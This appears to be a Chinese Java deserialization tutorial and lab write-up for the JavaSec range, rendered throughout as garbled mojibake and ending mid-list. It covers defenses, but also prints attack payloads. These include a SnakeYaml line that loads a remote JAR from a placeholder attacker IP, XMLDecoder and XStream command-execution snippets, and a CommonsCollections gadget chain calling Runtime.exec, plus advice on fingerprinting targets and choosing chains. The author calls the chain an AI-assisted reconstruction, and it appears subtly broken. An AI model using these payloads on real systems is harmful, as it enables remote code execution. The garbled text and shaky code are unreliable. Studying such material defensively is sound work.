 ## Javaååºåˆ—åŒ–1ï¼ˆåŸç”Ÿç±»ï¼‰

åºåˆ—åŒ–æ˜¯å°†Javaå¯¹è±¡è½¬æ¢æˆå­—èŠ‚æµçš„è¿‡ç¨‹ã€‚è€Œååºåˆ—åŒ–æ˜¯å°†å­—èŠ‚æµè½¬æ¢æˆJavaå¯¹è±¡çš„è¿‡ç¨‹ï¼Œjavaåºåˆ—åŒ–çš„æ•°æ®ä¸€èˆ¬ä¼šä»¥æ ‡è®°(ac ed 00 05)å¼€å¤´ï¼Œbase64ç¼–ç çš„ç‰¹å¾ä¸ºrO0ABï¼ŒJAVAå¸¸è§çš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„æ–¹æ³•æœ‰JAVA åŸç”Ÿåºåˆ—åŒ–å’ŒJSON ç±»ï¼ˆfastjsonã€jacksonï¼‰åºåˆ—åŒ–ç­‰ã€‚

Javaä¸­å¯åˆ†ä¸ºï¼šåŸç”Ÿååºåˆ—åŒ–ç±»(ObjectInputStream.readObject()ã€SnakeYamlã€XMLDecoderç­‰)ã€ä¸‰æ–¹ç»„ä»¶ååºåˆ—åŒ–(Fastjsonã€Jacksonã€Xstreamç­‰)

Javaååºåˆ—åŒ–æœºåˆ¶æ˜¯å¯¹è±¡æŒä¹…åŒ–å’Œç½‘ç»œä¼ è¾“çš„æ ¸å¿ƒï¼Œä½†ä¹Ÿå› å…¶å¤æ‚æ€§æˆä¸ºå®‰å…¨æ¼æ´çš„é«˜å‘åŒºã€‚ä»¥ä¸‹ä»åŸç”Ÿååºåˆ—åŒ–ç±»å’Œç¬¬ä¸‰æ–¹ç»„ä»¶ä¸¤æ–¹é¢è¿›è¡Œç³»ç»Ÿæ€§åˆ†æï¼š

------

## ä»‹ç»

### âš™ï¸ **ä¸€ã€åŸç”Ÿååºåˆ—åŒ–ç±»**

#### **1. `ObjectInputStream.readObject()`**

- **æœºåˆ¶**ï¼šJavaæ ‡å‡†åº“é€šè¿‡`ObjectInputStream`å°†å­—èŠ‚æµè¿˜åŸä¸ºå¯¹è±¡ï¼Œè¦æ±‚ç›®æ ‡ç±»å®ç°`Serializable`æ¥å£ã€‚

- **æµç¨‹**ï¼š

  ```
  try (ObjectInputStream ois = new ObjectInputStream(new FileInputStream("data.ser"))) {
      Employee emp = (Employee) ois.readObject(); // å¼ºåˆ¶ç±»å‹è½¬æ¢
  } catch (ClassNotFoundException | IOException e) {...}
  ```

- **ç‰¹æ€§**ï¼š

  - **ç‰ˆæœ¬å…¼å®¹**ï¼šä¾èµ–`serialVersionUID`æ ¡éªŒç±»å®šä¹‰ä¸€è‡´æ€§ï¼Œä¸åŒ¹é…åˆ™æŠ›å‡º`InvalidClassException`ã€‚
  - **å­—æ®µå¤„ç†**ï¼šå¿½ç•¥`static`å’Œ`transient`ä¿®é¥°çš„å­—æ®µï¼ˆåè€…å¸¸ç”¨äºæ’é™¤æ•æ„Ÿæ•°æ®å¦‚å¯†ç ï¼‰ã€‚

- **é£é™©**ï¼šæ¶æ„æ„é€ çš„å­—èŠ‚æµå¯è§¦å‘ä»»æ„ä»£ç æ‰§è¡Œï¼ˆå¦‚åˆ©ç”¨`readObject`ä¸­çš„é‡å†™é€»è¾‘ï¼‰ã€‚

#### **2. SnakeYaml**

- **ç”¨é€”**ï¼šè§£æYAMLæ•°æ®ä¸ºJavaå¯¹è±¡ï¼Œæ”¯æŒ`Yaml.load()`ååºåˆ—åŒ–ã€‚

- **è¯­æ³•ç‰¹æ€§**ï¼š

  - é€šè¿‡`!!`å¼ºåˆ¶ç±»å‹è½¬æ¢ï¼ˆå¦‚`!!com.example.User`ï¼‰ã€‚
  - æ”¯æŒåµŒå¥—ç»“æ„ï¼ˆå¦‚`[[åˆ—è¡¨]]`ï¼‰å’Œå¤æ‚æ˜ å°„ã€‚

- **æ¼æ´åŸç†**ï¼š

  - åˆ©ç”¨SPIæœºåˆ¶åŠ¨æ€åŠ è½½ç±»ï¼Œä¾‹å¦‚æ¶æ„æ„é€ `!!javax.script.ScriptEngineManager`åŠ è½½è¿œç¨‹JARï¼Œè§¦å‘é™æ€ä»£ç å—æ‰§è¡Œå‘½ä»¤ã€‚

  - å¤ç°POCï¼š

    ```
    !!javax.script.ScriptEngineManager [
      !!java.net.URLClassLoader [[!!java.net.URL ["http://æ”»å‡»è€…IP/malicious.jar"]]]
    ]
    ```

- **é˜²æŠ¤**ï¼šä½¿ç”¨`SafeConstructor`ç™½åå•é™åˆ¶å¯åŠ è½½ç±»ã€‚

#### **3. XMLDecoder**

- **æœºåˆ¶**ï¼šJDKå†…ç½®ç»„ä»¶ï¼Œè§£æXMLç”Ÿæˆå¯¹è±¡ï¼Œå¸¸ç”¨äºWebLogicç­‰åœºæ™¯ã€‚
- **é£é™©**ï¼š
  - å¯æ‰§è¡ŒJavaè¡¨è¾¾å¼ï¼ˆå¦‚`<java><void method="exec"><string>calc.exe</string></void></java>`ï¼‰ï¼Œç›´æ¥è§¦å‘å‘½ä»¤æ‰§è¡Œã€‚
- **ä¸æ ‡å‡†å·®å¼‚**ï¼šåŸºäºXMLæ ‡ç­¾æ„å»ºå¯¹è±¡ï¼Œè€Œéå­—èŠ‚æµï¼Œæ”»å‡»é¢æ›´å¹¿ã€‚

#### **åŸç”Ÿæ–¹å¼å¯¹æ¯”**

| **ç±»å‹**            | **æ•°æ®æ ¼å¼** | **å…³é”®æ–¹æ³•**   | **é«˜å±åœºæ™¯**          |
| ------------------- | ------------ | -------------- | --------------------- |
| `ObjectInputStream` | äºŒè¿›åˆ¶å­—èŠ‚æµ | `readObject()` | æ¶æ„å­—èŠ‚æµè§¦å‘RCE     |
| **SnakeYaml**       | YAMLæ–‡æœ¬     | `Yaml.load()`  | SPIæœºåˆ¶åŠ è½½è¿œç¨‹æ¶æ„ç±» |
| **XMLDecoder**      | XMLæ–‡æœ¬      | `readObject()` | è§£æXMLæ‰§è¡ŒJavaä»£ç    |

------

### ğŸ“¦ **äºŒã€ç¬¬ä¸‰æ–¹ååºåˆ—åŒ–ç»„ä»¶**

#### **1. Fastjson**

- **ç”¨é€”**ï¼šé˜¿é‡Œå¼€æºçš„JSONå¤„ç†åº“ï¼Œé€šè¿‡`JSON.parseObject()`ååºåˆ—åŒ–ã€‚
- **æ¼æ´æ¨¡å¼**ï¼š
  - åˆ©ç”¨`@type`æŒ‡å®šä»»æ„ç±»ï¼ˆå¦‚`com.sun.rowset.JdbcRowSetImpl`ï¼‰ï¼Œç»“åˆJNDIæ³¨å…¥å®ç°RCEã€‚
  - æ”»å‡»é“¾ï¼š`setDataSourceName()`è§¦å‘LDAPè¯·æ±‚åŠ è½½æ¶æ„ç±»ã€‚
- **ä¿®å¤**ï¼šå¯ç”¨`SafeMode`æˆ–å‡çº§åˆ°åŠ å›ºç‰ˆæœ¬ã€‚

#### **2. Jackson**

- **æœºåˆ¶**ï¼šSpringç”Ÿæ€é»˜è®¤JSONåº“ï¼Œé€šè¿‡`ObjectMapper.readValue()`ååºåˆ—åŒ–ã€‚
- **é£é™©**ï¼š
  - éœ€å¼€å¯å¤šæ€ç±»å‹è§£æï¼ˆ`enableDefaultTyping()`ï¼‰æ—¶ï¼Œæ”»å‡»è€…å¯é€šè¿‡`@JsonTypeInfo`æ³¨å…¥æ¶æ„å­ç±»ã€‚
- **é˜²æŠ¤**ï¼šç¦ç”¨å¤šæ€ç»‘å®šï¼Œä½¿ç”¨`@JsonTypeId`æ˜¾å¼æ§åˆ¶ç±»å‹ã€‚

#### **3. XStream**

- **ç”¨é€”**ï¼šXMLä¸å¯¹è±¡è½¬æ¢åº“ï¼Œæ”¯æŒ`fromXML()`æ–¹æ³•ã€‚
- **æ¼æ´**ï¼š
  - æœªé…ç½®ç±»å‹é™åˆ¶æ—¶ï¼Œå¯æ„é€ XMLè°ƒç”¨`ProcessBuilder`æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼ˆå¦‚`<java.lang.ProcessBuilder><command>calc.exe</command></java.lang.ProcessBuilder>`ï¼‰ã€‚
- **åŠ å›º**ï¼šé€šè¿‡`XStream.setupDefaultSecurity()`è®¾ç½®ç±»å‹é»‘åå•ã€‚

#### **ç¬¬ä¸‰æ–¹åº“é£é™©å…±æ€§**

- **å…¥å£ç‚¹**ï¼šå‡é€šè¿‡è‡ªå®šä¹‰æ³¨è§£æˆ–å­—æ®µï¼ˆå¦‚Fastjsonçš„`@type`ã€Jacksonçš„`@JsonTypeInfo`ï¼‰æŒ‡å®šç±»å‹ã€‚
- **åˆ©ç”¨é“¾**ï¼šä¾èµ–ç›®æ ‡ç¯å¢ƒä¸­çš„å±é™©ç±»ï¼ˆå¦‚`JdbcRowSetImpl`ã€`TemplatesImpl`ï¼‰ã€‚

------

### ğŸ›¡ï¸ **ä¸‰ã€ååºåˆ—åŒ–å®‰å…¨é˜²æŠ¤**

1. **è¾“å…¥æ ¡éªŒ**
   - ç¦æ­¢ååºåˆ—åŒ–ä¸å¯ä¿¡æ•°æ®æºï¼ˆå¦‚ç”¨æˆ·ä¸Šä¼ æ–‡ä»¶ã€ç½‘ç»œè¯·æ±‚ï¼‰ã€‚
2. **ç±»ç™½åå•**
   - SnakeYamlä½¿ç”¨`SafeConstructor`ï¼ŒFastjsonå¯ç”¨`SafeMode`ï¼ŒXStreamæ³¨å†Œ`AllowedClassTypes`ã€‚
3. **ä¾èµ–ç®¡ç†**
   - ç§»é™¤å±é™©ç±»ï¼ˆå¦‚`com.sun.rowset.JdbcRowSetImpl`ï¼‰ï¼Œå‡çº§åº“ç‰ˆæœ¬ä¿®å¤å·²çŸ¥æ¼æ´ã€‚
4. **è¿è¡Œæ—¶ç›‘æ§**
   - é€šè¿‡Java Agentæ£€æµ‹æ•æ„Ÿæ–¹æ³•è°ƒç”¨ï¼ˆå¦‚`Runtime.exec()`ï¼‰ã€‚

#### **æ¼æ´å½±å“å¯¹æ¯”**

| **æ¼æ´ç±»å‹**    | **åˆ©ç”¨éš¾åº¦** | **å½±å“èŒƒå›´**   | **é˜²å¾¡éš¾ç‚¹**              |
| --------------- | ------------ | -------------- | ------------------------- |
| **SPIç±»åŠ è½½é“¾** | ä¸­           | ä»»æ„ä»£ç æ‰§è¡Œ   | éœ€å®Œå…¨é™åˆ¶å¤–éƒ¨ç±»åŠ è½½      |
| **JNDIæ³¨å…¥é“¾**  | ä½           | è¿œç¨‹ç±»åŠ è½½+RCE | ä¾èµ–JDKç‰ˆæœ¬ï¼ˆ>8u191ç¼“è§£ï¼‰ |
| **è¡¨è¾¾å¼æ³¨å…¥**  | é«˜           | æœ¬åœ°ä»£ç æ‰§è¡Œ   | XML/JSONè§£æé€»è¾‘å¤æ‚æ€§    |

------

### ğŸ’ **æ€»ç»“**

Javaååºåˆ—åŒ–æ˜¯å¼€å‘ä¸­çš„åŒåˆƒå‰‘ï¼š**åŸç”Ÿæœºåˆ¶**ï¼ˆå¦‚`ObjectInputStream`ã€XMLDecoderï¼‰éœ€è­¦æƒ•å­—èŠ‚æµç¯¡æ”¹ï¼›**ç¬¬ä¸‰æ–¹åº“**ï¼ˆå¦‚Fastjsonã€SnakeYamlï¼‰çš„çµæ´»è¯­æ³•å¸¦æ¥æ›´å¤§æ”»å‡»é¢ã€‚é˜²æŠ¤æ ¸å¿ƒåœ¨äºï¼š**ä¸¥æ ¼æ ¡éªŒè¾“å…¥**ã€**é™åˆ¶å¯ååºåˆ—åŒ–ç±»å‹**ã€**åŠæ—¶æ›´æ–°ä¾èµ–**ã€‚åœ¨å®é™…å¼€å‘ä¸­ï¼Œè‹¥éå¿…è¦åœºæ™¯ï¼ˆå¦‚RPCä¼ è¾“ï¼‰ï¼Œå»ºè®®ä¼˜å…ˆé€‰ç”¨JSONç­‰å®‰å…¨åºåˆ—åŒ–æ ¼å¼ï¼Œé¿å…ä½¿ç”¨åŸç”ŸäºŒè¿›åˆ¶æˆ–å¤æ‚åµŒå¥—ç»“æ„çš„æ•°æ®æ ¼å¼ã€‚

## é¶åœº

https://github.com/bewhale/JavaSec

éƒ¨ç½²ï¼š

> git clone https://github.com/bewhale/JavaSec.git
>
> ![image-20250817202102756](./images/Javaååºåˆ—åŒ–/image-20250817202102756.png)
>
> ![image-20250817202233197](./images/Javaååºåˆ—åŒ–/image-20250817202233197.png)
>
> ä½¿ç”¨ideaçš„æ•°æ®åº“é“¾æ¥
>
> ![image-20250817202354020](./images/Javaååºåˆ—åŒ–/image-20250817202354020.png)
>
> ![image-20250817202445424](./images/Javaååºåˆ—åŒ–/image-20250817202445424.png)
>
> é€‰æ‹©ä¸‹è½½é¡¹ç›®ä¸‹çš„sqlæ–‡ä»¶æ‰§è¡Œä¹‹åï¼Œé…ç½®é¡¹ç›®
>
> ![image-20250817202638395](./images/Javaååºåˆ—åŒ–/image-20250817202638395.png)
>
> é€‰æ‹©jdk1.8ç‰ˆæœ¬ã€‚ç„¶åå°±å¯ä»¥å¯åŠ¨äº†
>
> http://127.0.0.1:8000/ 
>
> admin/admin
>
> ![image-20250817204917444](./images/Javaååºåˆ—åŒ–/image-20250817204917444.png)



## åºåˆ—åŒ–æ¼æ´

æ¥åˆ°åºåˆ—åŒ–ä¸“é¢˜

### readObjext

Java ååºåˆ—åŒ–

åºåˆ—åŒ–æ˜¯å°† Java å¯¹è±¡è½¬æ¢æˆå­—èŠ‚æµçš„è¿‡ç¨‹ã€‚è€Œååºåˆ—åŒ–æ˜¯å°†å­—èŠ‚æµè½¬æ¢æˆ Java å¯¹è±¡çš„è¿‡ç¨‹

javaåºåˆ—åŒ–çš„æ•°æ®ä¸€èˆ¬ä¼šä»¥æ ‡è®°(ac ed 00 05)å¼€å¤´ï¼Œbase64ç¼–ç åçš„ç‰¹å¾ä¸ºrO0AB

JAVA å¸¸è§çš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„æ–¹æ³•æœ‰JAVA åŸç”Ÿåºåˆ—åŒ–å’Œ JSON ç±»ï¼ˆfastjsonã€jacksonï¼‰åºåˆ—åŒ–

åºåˆ—åŒ–å’Œååºåˆ—åŒ–é€šè¿‡ObjectInputStream.readObject()å’ŒObjectOutputStream.writeObject()æ–¹æ³•å®ç°ã€‚åœ¨javaä¸­ä»»ä½•ç±»å¦‚æœæƒ³è¦åºåˆ—åŒ–å¿…é¡»å®ç°java.io.Serializableæ¥å£

java.io.Serializableå…¶å®æ˜¯ä¸€ä¸ªç©ºæ¥å£ï¼Œåœ¨javaä¸­è¯¥æ¥å£çš„å”¯ä¸€ä½œç”¨æ˜¯å¯¹ä¸€ä¸ªç±»åšä¸€ä¸ªæ ‡è®°ï¼Œè®©jreç¡®å®šè¿™ä¸ªç±»æ˜¯å¯ä»¥åºåˆ—åŒ–çš„ã€‚

åŒæ—¶javaä¸­æ”¯æŒåœ¨ç±»ä¸­å®šä¹‰writeObjectã€readObjectå‡½æ•°ï¼Œè¿™ä¸¤ä¸ªå‡½æ•°ä¸æ˜¯java.io.Serializableçš„æ¥å£å‡½æ•°ï¼Œè€Œæ˜¯çº¦å®šçš„å‡½æ•°

å¦‚æœä¸€ä¸ªç±»å®ç°äº†è¿™ä¸¤ä¸ªå‡½æ•°ï¼Œé‚£ä¹ˆåœ¨åºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„æ—¶å€™ObjectInputStream.readObject()å’ŒObjectOutputStream.writeObject()ä¼šä¸»åŠ¨è°ƒç”¨è¿™ä¸¤ä¸ªå‡½æ•°ã€‚è¿™ä¹Ÿæ˜¯ååºåˆ—åŒ–äº§ç”Ÿçš„æ ¹æœ¬åŸå› 

![image-20250817225010002](./images/Javaååºåˆ—åŒ–/image-20250817225010002.png)

æŸ¥çœ‹åç«¯ä»£ç 

![image-20250817225104004](./images/Javaååºåˆ—åŒ–/image-20250817225104004.png)

> è¿™æ®µä»£ç ç›´æ¥ååºåˆ—åŒ–è¾“å…¥çš„base64ç¼–ç çš„æ•°æ®
>
> - 1ã€**è¾“å…¥æ§åˆ¶ç‚¹**ï¼š`content`å‚æ•°ç›´æ¥æ¥æ”¶ç”¨æˆ·è¾“å…¥ï¼Œç»è¿‡Base64è§£ç åç›´æ¥è¿›è¡Œååºåˆ—åŒ–æ“ä½œã€‚æ”»å‡»è€…å¯ä»¥æ„é€ æ¶æ„çš„åºåˆ—åŒ–å¯¹è±¡ï¼Œåˆ©ç”¨`readObject()`æ–¹æ³•è§¦å‘ä»»æ„ä»£ç æ‰§è¡Œ
>
> - 2ã€**Base64è§£ç é—®é¢˜**ï¼šè™½ç„¶ä»£ç å¤„ç†äº†ç©ºæ ¼æ›¿æ¢åŠ å·çš„é—®é¢˜ï¼ˆé˜²æ­¢HTTPä¼ è¾“è¿‡ç¨‹ä¸­åŠ å·è¢«è½¬ä¹‰ä¸ºç©ºæ ¼ï¼‰ï¼Œä½†æ²¡æœ‰å¯¹è¾“å…¥å†…å®¹è¿›è¡Œä»»ä½•éªŒè¯æˆ–è¿‡æ»¤
>
> - 3ã€**å±é™©çš„ååºåˆ—åŒ–æ“ä½œ**ï¼š`java.io.ObjectInputStream`ç›´æ¥ååºåˆ—åŒ–ä¸å¯ä¿¡æ•°æ®ï¼Œå¦‚æœç¯å¢ƒä¸­å­˜åœ¨å¯åˆ©ç”¨çš„Gadget Chainï¼ˆå¦‚Apache Commons Collectionsï¼‰ï¼Œå¯èƒ½å¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œ

æ‰€ä»¥å½“æˆ‘ä»¬ç‚¹å‡»æ‰§è¡Œå°±ä¼šå¼¹å‡ºè®¡ç®—å™¨

æ‰§è¡Œæµç¨‹

![image-20250817231341939](./images/Javaååºåˆ—åŒ–/image-20250817231341939.png)

ä¸‹é¢æ˜¯å¯¹payloadçš„è¿˜åŸï¼Œå¯èƒ½ä¸å‡†ç¡®ï¼Œé€šè¿‡å·¥å…·é…åˆaiè¿˜åŸçš„

```java
// æ ¸å¿ƒæ¼æ´åˆ©ç”¨é“¾ï¼ˆåŸºäºCommonsCollections5ï¼‰
import javax.management.BadAttributeValueExpException;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.*;
import org.apache.commons.collections.map.LazyMap;
import java.util.HashMap;
import java.lang.reflect.*;

public class MaliciousPayload {
    public static void main(String[] args) throws Exception {
        // 1. æ„é€ Transformerè°ƒç”¨é“¾ï¼ˆæ ¸å¿ƒæ”»å‡»ä»£ç ï¼‰
        Transformer[] transformers = new Transformer[] {
            new ConstantTransformer(Runtime.class),
            new InvokerTransformer("getMethod", 
                new Class[] {String.class, Class[].class}, 
                new Object[] {"getRuntime", new Class[0]}),
            new InvokerTransformer("invoke", 
                new Class[] {Object.class, Object[].class}, 
                new Object[] {null, new Object[0]}),
            new InvokerTransformer("exec", 
                new Class[] {String.class}, 
                new Object[] {"calc.exe"}) // å®é™…æ”»å‡»ä¼šæ›¿æ¢ä¸ºæ¶æ„å‘½ä»¤
        };
        
        // 2. åŒ…è£…æˆChainedTransformer
        Transformer transformerChain = new ChainedTransformer(transformers);
        
        // 3. ä½¿ç”¨LazyMapè§¦å‘æ¼æ´
        HashMap<String, String> map = new HashMap<>();
        Map lazyMap = LazyMap.decorate(map, transformerChain);
        
        // 4. é€šè¿‡BadAttributeValueExpExceptionè§¦å‘ååºåˆ—åŒ–
        BadAttributeValueExpException payload = new BadAttributeValueExpException(null);
        Field valField = payload.getClass().getDeclaredField("val");
        valField.setAccessible(true);
        valField.set(payload, lazyMap);
        
        // 5. åºåˆ—åŒ–payloadå¯¹è±¡ï¼ˆå®é™…æ”»å‡»ä¸­å‘é€ç»™ç›®æ ‡ï¼‰
        // ByteArrayOutputStream bos = new ByteArrayOutputStream();
        // ObjectOutputStream oos = new ObjectOutputStream(bos);
        // oos.writeObject(payload);
        // oos.close();
    }
}
```

æ•´ä¸ªè¿‡ç¨‹çš„å…³é”®æ˜¯**ååºåˆ—åŒ–æ—¶çš„ â€œéšå¼æ–¹æ³•è°ƒç”¨â€**ï¼š
`ObjectInputStream.readObject()` â†’ é‡å»º`BadAttributeValueExpException` â†’ è®¿é—®`val`å­—æ®µï¼ˆ`LazyMap`ï¼‰ â†’ è§¦å‘`LazyMap.get()` â†’ æ‰§è¡Œ`ChainedTransformer`è°ƒç”¨é“¾ â†’ æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚

#### å·¥å…·åˆ©ç”¨

#### Yakit

-Yakit https://yaklang.com/    

![image-20250818201836064](./images/Javaååºåˆ—åŒ–/image-20250818201836064.png)

ç²˜è´´åå°±å¯ä»¥å¼¹å‡ºè®¡ç®—å™¨äº†

åœ¨æµ‹è¯•çš„æ—¶å€™å¯ä»¥å…ˆä½¿ç”¨å…ˆç”¨ â€œæ— å±å®³æ¢æµ‹é“¾â€ éªŒè¯ååºåˆ—åŒ–æ¼æ´å­˜åœ¨

![image-20250818202755093](./images/Javaååºåˆ—åŒ–/image-20250818202755093.png)

![image-20250818202954523](./images/Javaååºåˆ—åŒ–/image-20250818202954523.png)

ç„¶åæäº¤

![image-20250818203008778](./images/Javaååºåˆ—åŒ–/image-20250818203008778.png)

å°±å¯ä»¥çœ‹åˆ°æ•°æ®äº†

> åœ¨ Java ååºåˆ—åŒ–åˆ©ç”¨ä¸­ï¼Œé€‰æ‹©åˆé€‚çš„åˆ©ç”¨é“¾ï¼ˆGadget Chainï¼‰æ ¸å¿ƒåœ¨äº**åŒ¹é…ç›®æ ‡ç¯å¢ƒçš„ä¾èµ–åº“ã€ç‰ˆæœ¬åŠåº”ç”¨ç‰¹æ€§**ã€‚å·¥å…·ï¼ˆå¦‚ ysoserialã€marshalsec ç­‰ï¼‰åªæ˜¯ç”Ÿæˆå¯¹åº”é“¾çš„ payloadï¼Œèƒ½å¦æˆåŠŸåˆ©ç”¨å®Œå…¨å–å†³äºç›®æ ‡ç¯å¢ƒæ˜¯å¦æ»¡è¶³è¯¥é“¾çš„ â€œè§¦å‘æ¡ä»¶â€ã€‚ä»¥ä¸‹æ˜¯åˆ¤æ–­å’Œé€‰æ‹©åˆ©ç”¨é“¾çš„æ ¸å¿ƒæ€è·¯ï¼š
>
> ### ä¸€ã€æ ¸å¿ƒåˆ¤æ–­ä¾æ®ï¼šç›®æ ‡ç¯å¢ƒä¿¡æ¯
>
> ä»»ä½•åˆ©ç”¨é“¾çš„è§¦å‘éƒ½ä¾èµ–ç›®æ ‡ç¯å¢ƒä¸­å­˜åœ¨ç‰¹å®šçš„ç±»ï¼ˆé€šå¸¸æ¥è‡ªç¬¬ä¸‰æ–¹åº“ï¼‰ï¼Œä¸”è¿™äº›ç±»çš„ç‰ˆæœ¬æ”¯æŒé“¾çš„è°ƒç”¨é€»è¾‘ï¼ˆæœªè¢«ä¿®å¤ï¼‰ã€‚å› æ­¤ï¼Œ**æ”¶é›†ç›®æ ‡ç¯å¢ƒä¿¡æ¯æ˜¯ç¬¬ä¸€æ­¥**ã€‚
>
> #### 1. ç¡®å®šç›®æ ‡ä½¿ç”¨çš„æ¡†æ¶ / ä¾èµ–åº“
>
> ååºåˆ—åŒ–åˆ©ç”¨é“¾å‡ ä¹éƒ½ä¾èµ–ç¬¬ä¸‰æ–¹åº“ï¼ˆå¦‚ Apache Commons Collectionsã€Jacksonã€ROME ç­‰ï¼‰ï¼Œæˆ–åº”ç”¨æœåŠ¡å™¨è‡ªå¸¦çš„åº“ï¼ˆå¦‚ WebLogicã€JBoss çš„å†…ç½®ç±»ï¼‰ã€‚éœ€é€šè¿‡ä»¥ä¸‹æ–¹å¼æ”¶é›†ï¼š
>
> - æŒ‡çº¹è¯†åˆ«ï¼šé€šè¿‡åº”ç”¨å“åº”å¤´ã€é”™è¯¯é¡µé¢ï¼ˆå¦‚500é”™è¯¯æ ˆï¼‰ã€ç‰¹æ®Šè·¯å¾„ï¼ˆå¦‚/META-INF/maven/ï¼‰è·å–ä¾èµ–ä¿¡æ¯ã€‚ä¾‹å¦‚ï¼š
>   - é”™è¯¯æ ˆä¸­å‡ºç°`org.apache.commons.collections` â†’ å­˜åœ¨ Commons Collections åº“ï¼›
>   - å“åº”å¤´åŒ…å«`X-Powered-By: JBoss` â†’ å¯èƒ½å­˜åœ¨ JBoss ç›¸å…³åº“ã€‚
> - **æ–‡ä»¶æ³„éœ²**ï¼šè‹¥èƒ½è·å–ç›®æ ‡çš„`WEB-INF/lib/`ç›®å½•ï¼ˆå¦‚é€šè¿‡ç›®å½•éå†æ¼æ´ï¼‰ï¼Œç›´æ¥æŸ¥çœ‹åŒ…å«çš„`jar`åŒ…ï¼ˆå¦‚`commons-collections-3.2.1.jar`ï¼‰ã€‚
> - **ä¸»åŠ¨æ¢æµ‹**ï¼šç”¨æ— å±å®³çš„ â€œæ¢æµ‹é“¾â€ï¼ˆå¦‚ URLDNS é“¾ï¼‰æµ‹è¯•æ—¶ï¼Œç»“åˆç›®æ ‡æ˜¯å¦æœ‰ç‰¹å®šç±»çš„åŠ è½½è¡Œä¸ºï¼ˆéœ€é…åˆæ—¥å¿—æˆ–æµé‡åˆ†æï¼‰ã€‚
>
> #### 2. ç¡®è®¤ä¾èµ–åº“çš„ç‰ˆæœ¬
>
> åŒä¸€åº“çš„ä¸åŒç‰ˆæœ¬å¯èƒ½æ”¯æŒä¸åŒçš„é“¾ã€‚ä¾‹å¦‚ï¼š
>
> - Apache Commons Collectionsï¼š
>   - 3.1~3.2.1 ç‰ˆæœ¬æ”¯æŒ`CommonsCollections1-7`ç­‰é“¾ï¼›
>   - 4.x ç‰ˆæœ¬ç§»é™¤äº†éƒ¨åˆ†å…³é”®ç±»ï¼ˆå¦‚`Transformer`ç›¸å…³ï¼‰ï¼ŒåŸé“¾å¤±æ•ˆï¼›
> - Jacksonï¼š
>   - 2.8.10 ä¹‹å‰çš„ç‰ˆæœ¬æ”¯æŒ`Jackson`é“¾ï¼Œé«˜ç‰ˆæœ¬ä¿®å¤äº†`@JsonTypeInfo`çš„ååºåˆ—åŒ–æ¼æ´ã€‚
>
> éœ€é€šè¿‡ç‰ˆæœ¬å·ï¼ˆå¦‚`jar`åŒ…åä¸­çš„`3.2.1`ï¼‰æˆ–æ¼æ´åº“ï¼ˆå¦‚ CVEï¼‰ç¡®è®¤ç‰ˆæœ¬å…¼å®¹æ€§ã€‚
>
> #### 3. åˆ†æç›®æ ‡åº”ç”¨ç±»å‹åŠé™åˆ¶
>
> - **åº”ç”¨æœåŠ¡å™¨ç±»å‹**ï¼šWebLogicã€JBossã€Tomcat ç­‰æœ‰å„è‡ªä¸“å±çš„åˆ©ç”¨é“¾ï¼ˆå¦‚ WebLogic çš„`wls9_async`é“¾ï¼Œä¾èµ–å…¶å†…ç½®çš„`AsyncResponseService`ç±»ï¼‰ã€‚
> - **Java ç‰ˆæœ¬**ï¼šé«˜ç‰ˆæœ¬ Javaï¼ˆå¦‚ 8u121+ã€9+ï¼‰å¼•å…¥äº†`serialFilter`ã€æ¨¡å—åŒ–é™åˆ¶ç­‰ï¼Œå¯èƒ½é˜»æ–­éƒ¨åˆ†é“¾ï¼ˆå¦‚`CommonsCollections1`åœ¨é«˜ç‰ˆæœ¬ Java ä¸­å¯èƒ½å› åå°„æƒé™è¢«ç¦è€Œå¤±æ•ˆï¼‰ã€‚
> - **å®‰å…¨ç®¡ç†å™¨ï¼ˆSecurityManagerï¼‰**ï¼šè‹¥ç›®æ ‡å¯ç”¨äº†å®‰å…¨ç®¡ç†å™¨ï¼Œå¯èƒ½é™åˆ¶`Runtime.exec()`ç­‰å…³é”®æ“ä½œï¼Œéœ€é€‰æ‹©ç»•å¼€é™åˆ¶çš„é“¾ã€‚
>
> ### äºŒã€å·¥å…·ä½¿ç”¨æ—¶çš„é“¾é€‰æ‹©é€»è¾‘
>
> ä»¥æœ€å¸¸ç”¨çš„`ysoserial`ä¸ºä¾‹ï¼Œå…¶å†…ç½®äº†æ•°åç§é“¾ï¼ˆå¦‚`CommonsCollections1`ã€`URLDNS`ã€`ROME`ç­‰ï¼‰ï¼Œé€‰æ‹©é€»è¾‘å¦‚ä¸‹ï¼š
>
> #### 1. å…ˆç”¨ â€œæ— å±å®³æ¢æµ‹é“¾â€ éªŒè¯ååºåˆ—åŒ–æ¼æ´å­˜åœ¨
>
> ä¼˜å…ˆä½¿ç”¨**ä»…è§¦å‘ç½‘ç»œè¯·æ±‚æˆ–æ—¥å¿—è®°å½•**çš„é“¾ï¼Œé¿å…å¯¹ç›®æ ‡é€ æˆå½±å“ï¼ŒåŒæ—¶éªŒè¯ååºåˆ—åŒ–å…¥å£æ˜¯å¦æœ‰æ•ˆã€‚ä¾‹å¦‚ï¼š
>
> - URLDNS é“¾ï¼šè§¦å‘ç›®æ ‡å¯¹æŒ‡å®šåŸŸåçš„ DNS æŸ¥è¯¢ï¼ˆå¯é€šè¿‡ DNSlog å¹³å°ç›‘æµ‹ï¼‰ï¼Œé€‚ç”¨äºå‡ ä¹æ‰€æœ‰ç¯å¢ƒï¼ˆä»…ä¾èµ– JDK å†…ç½®ç±»ï¼‰ã€‚
>   - è‹¥ DNSlog æœ‰è®°å½• â†’ ç›®æ ‡å­˜åœ¨ååºåˆ—åŒ–æ¼æ´ï¼Œå¯ç»§ç»­å°è¯•æ‰§è¡Œå‘½ä»¤çš„é“¾ï¼›
>   - è‹¥æ— è®°å½• â†’ å¯èƒ½å…¥å£æ— æ•ˆï¼Œæˆ–è¢«åºåˆ—åŒ–è¿‡æ»¤æ‹¦æˆªã€‚
>
> #### 2. æ ¹æ®ä¾èµ–åº“åŒ¹é…å¯æ‰§è¡Œå‘½ä»¤çš„é“¾
>
